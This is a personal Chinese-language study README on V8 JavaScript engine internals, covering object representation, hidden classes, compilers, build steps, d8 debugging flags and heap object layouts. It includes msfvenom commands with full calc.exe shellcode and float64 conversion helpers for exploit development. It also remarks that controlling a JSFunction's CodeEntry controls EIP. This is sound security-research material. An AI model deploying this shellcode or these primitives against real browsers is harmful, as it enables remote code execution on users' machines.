# Learning V8
## Workflow

1. https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine-english-version 
2. http://eternalsakura13.com/2018/06/16/nodefest_v8/
3. [How JavaScript works系列@zlatkov](https://blog.sessionstack.com/@zlatkov)

```
The Engine consists of two main components:
* Memory Heap — this is where the memory allocation happens
* Call Stack — this is where your stack frames are as your code executes
```
![](README/README21.png)



V8内部是多线程的:

1. 主线程
    编译执行JavaScript

2. 一个单独的线程用于编译，当优化代码时，主线程也能继续执行

3. 分析线程
    
    分析哪个函数耗时，需要被优化

4. 垃圾回收线程




## Object Representation
1. https://v8.dev/blog/fast-properties
2. http://www.jayconrod.com/posts/52/a-tour-of-v8--object-representation

### Object表示
对象内存结构一般如下图所示

![](README/README18.png)

对应下图

![](README/README19.png)

当有过多增加、删除属性的操作时，维护Hidden Class的成本很高；对象属性的存储方式退化到字典模式

![](README/README20.png)

### Hidden Class
当增加一个新的属性时，Old Hidden Class会增加一个到New Hidden Class的transition path，New Hidden Class会增加一个FIELD描述，描述新增加属性的相对偏移。transition 描述符使得那些以相同方式创建的object能够共享hidden class。

![](README/README23.png)

不同的创建顺序，意味着不同的transition path, 从而p1,p2的hidden class不同。 建议以相同顺序初始化object，使得它们能共用hidden class；也能做inline caching，提供性能。

![](README/README24.png)

### Elements
https://v8.dev/blog/elements-kinds

我们将属性名为非负整数（0、1、2……）的属性称为Element。V8中，Element的存放和其他属性是分开的。每个对象都有一个指向Element数组的指针，对象Map中的Element Field将反映出Element是如何存储的, 常见的Elements Kind及其变化如下所示：

变化过程是不可逆的，且越往下/后变化，操作耗费越大

如果你在远远超过当前数组大小的下标赋值，V8会将数组转换为字典模式，将值以哈希表的形式存储。

```
const array = [1, 2, 3];
// elements kind: PACKED_SMI_ELEMENTS
array.push(4.56);
// elements kind: PACKED_DOUBLE_ELEMENTS
array.push('x');
// elements kind: PACKED_ELEMENTS

array.length; // 5
array[9] = 1; // array[5] until array[8] are now holes
// elements kind: HOLEY_ELEMENTS
```

![](README/README27.png)

## Optimization
1. https://juejin.im/post/59f95af951882574d1723e70#heading-8 

在V8 5.9之前，V8有两个编译器：

1. baseline编译器， full-codegen
   将解析过的JavaScript(AST)直接翻译成机器码（machine code）, 此时的machine code还有很多冗余，执行速度相对较慢

2. 优化编译器，Crankshaft
   优化是一个单独的线程，AST -> Hydrogen graph -> optimize Hydrogen graph -> Lithium -> optimized machine code


![](README/README22.png)


V8优化机制

1. Inlining

预先内联尽可能多的代码，用函数主题替换函数调用

2. Hidden class

以字典模式(hash 模式)存储、访问对象非常耗时，V8使用hidden class
每个property的值都以数组的形式进行管理, 通过偏移值访问数组里的property值

3. Inline caching

基于假设：对同一个函数的多次调用发生在同一类object上

当同一个hidden class上发生两次相同函数调用时，V8略去了hidden class的查找，而是使用上次查找到的偏移

4. Compilation to machine code

这段可能理解地不太对。。。。

对于耗时的函数，Crankshaft会生成优化机器码。优化是在独立的线程做的，V8会转换当前执行的上下文，在执行慢代码的过程中切换到优化后版本，这个过程称之为OSR: on-stack replacement。

5. Garbage collection

标记清除方法

标记过程会终止JavaScript执行，为了控制GC成本和JavaScript的执行稳定，V8使用增量标记清除。

它不会遍历整个堆，而是遍历一部分后恢复执行，下次从上次遍历终止处继续开始。

![](README/README26.png)

** Ignition and TurboFan **

引入生成中间语言(bytecode)的Ignition和优化编译器TurboFan，显著地提升了性能、节省了内存使用

![](README/README25.png)

How to write better JavaScript？

1. 对象属性初始化顺序一致

2. 在构造函数时初始化好对象，避免属性的动态添加，增加维护hidden class的成本

3. 多次重复调用一个函数

4. 避免稀疏数组，稀疏数组其实是一个hash表，获取元素代价较高

5. 多使用SMI数值，非SMI数值，V8需要将它转成double表示，并生成一个新的object来存储它。   


## Build V8
1. https://medium.com/dailyjs/how-to-build-v8-on-windows-and-not-go-mad-6347c69aacd4
2. http://eternalsakura13.com/2018/06/26/v8_environment/
3. http://blog.gclxry.com/use-depot_tools-to-manage-chromium-source/ (介绍depot_tools)

```
cd ~/v8/v8
git reset --hard a7a350012c05f644f3f373fb48d7ac72f7f60542
gclient sync
tools/dev/v8gen.py x64.debug 
ninja -C out.gn/x64.debug 
```


# 调试

## 速查
1. [What Version of V8 My Chromium Browser Is Using ?](http://erossignon.github.io/blog/2014/08/22/how-to-find-the-version-of-the-v8-my-chromium-browser-is-using/)

```
chrome://version/
http://src.chromium.org/viewvc/chrome/releases/
```
*** print-opt-code之类的，release版本D8 shell是不支持的 ***

*** print-bytecode也得在支持Ignition的V8里使用啊，之前都不生成bytecode啊。。。似乎Chrome59才支持的 *** 

### D8 参数
1. https://github.com/hilongjw/v8-RuntimeFunctions-list
2. https://github.com/v8/v8/blob/master/src/runtime/runtime.h
3. https://gist.github.com/kevincennis/0cd2138c78a07412ef21 (D8用法)

```
--allow-natives-syntax

--trace-opt 
--trace-deopt
--trace-opt-verbose

--code-comments
--print-opt-code
--print_unopt_code
--trace-elements-transitions

%DebugPrint 
%OptimizeFunctionOnNextCall

```

### 断点
```
// %DebugPrint 可以打印出变量信息，包括地址、结构； 
// bu v8_libbase!v8::base::ieee754::atan    下断点，可以停下来
// bu v8_libbase!v8::base::ieee754::sin     似乎sin比atan稳定
var a = [0xdeadbee, 0xdeadbee, 0xdeadbee];
%DebugPrint(a);
Math.atan(1);
Math.sin(1);

```
![](README/README17.png)

### Metasploit 生成payload
```
msfvenom -p windows/exec cmd=calc.exe  -fc
msfvenom -p windows/x64/exec cmd=calc.exe  -fc

var shellcode_dict = {
"x86":"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
+"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
+"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
+"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
+"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
+"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
+"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
+"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
+"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
+"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
+"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00", 
"x64": "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
+"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
+"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
+"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
+"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
+"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
+"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
+"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
+"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
+"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
+"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
+"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
+"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
+"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
+"\x63\x2e\x65\x78\x65\x00"};
```

### 工具函数
```
// arraybuffer to string
function ab2str(buf) {
  return String.fromCharCode.apply(null, new Uint16Array(buf));
}

// string to arraybuffer
function str2ab(str) {
  var buf = new ArrayBuffer(str.length); // 2 bytes for each char
  var bufView = new Uint8Array(buf);
  for (var i=0, strLen=str.length; i<strLen; i++) {
    bufView[i] = str.charCodeAt(i);
  }
  return buf;
}

// 内存中的双字节表示 -> 实际值
function decode_from_float64(num){
    num1 = num/0x100000000;
    num2 = num&0xffffffff;
    d = new Uint32Array(2);
    d[0] = num2;
    d[1] = num1;
    f = new Float64Array(d.buffer);
    return f[0];
}

// 实际值 -> 内存中双字节表示
function encode_to_float64(num){
    f = new Float64Array(1);
    f[0] = num;
    d = new Uint32Array(f.buffer);
    return d[1] * 0x100000000 + d[0];
}

```


## Object 内存布局
参考：
http://eternalsakura13.com/2018/05/06/v8/

```
<html>
<script>
    var a = [0xdeadbee, 0xdeadbeef, 4.231256, "testtesttestcy", true, false, null, undefined]
    alert("1111");
</script>
</html>

```
1. Small Int
64位： [0x0, 0x7fffffff]
![](README/README0.png)
![](README/README1.png)

2. HeapNumber (超过Small Int范围的Int、Double)
首先，数组中存放的是HeapObject指针

![](README/README2.png)

HeapNumber结构
![](README/README3.png)

调试如下：
![](README/README4.png)

![](README/README5.png)

3. PropertyCell
不知道是啥，先记着

![](README/README6.png)

4. String
![](README/README7.png)

![](README/README8.png)

5. Oddball
没调出来。。。

表示特殊值的对象，例如true，false，undefined, null

![](README/README9.png)

6. JSObject

没调出来

![](README/README10.png)

7. JSFunction
如果能控制CodeEntry，则控制了EIP

![](README/README11.png)


8. JSArray
![](README/README12.png)
![](README/README13.png)


9. JSArrayBuffer
![](README/README16.png)

![](README/README15.png)

![](README/README14.png)


10 Map 
```
map{        //  大小 0x2c(X86)
    +0x00   map
    +0x04   istance_size    // byte
    +0x05   InObjectProperties_or_ConstructorFunctionIndex      //byte
    +0x06   unused
    +0x07   visitorId       //byte
    +0x08   instance_type   //byte
    +0x09   bit_field       //byte
    +0x0a   bit_field2      //byte
    +0x0b   unused
    +0x0c   bit_field3      //byte
    +0x10   prototype   
    +0x14   constructor 
    +0x18   transitor_or_protytypeInfo
    +0x1c   discriptor
    +0x20   CodeCache
    +0x24   DependentCode
    +0x28   WeakCellCache
}
```


## Assembly code

```
var array = [1.1];

function f() {
    %DebugPrint(array);  //调试函数
    Math.sin(1);   // 调试函数
    array[0] = 6.176516726456e-312;
}

f();
%OptimizeFunctionOnNextCall(f);
f();

>> d8.exe --allow-natives-syntax --code_comments --print_opt_code --print_unopt_code test.js
```

![](README/README28.png)

优化版本：

![](README/README29.png)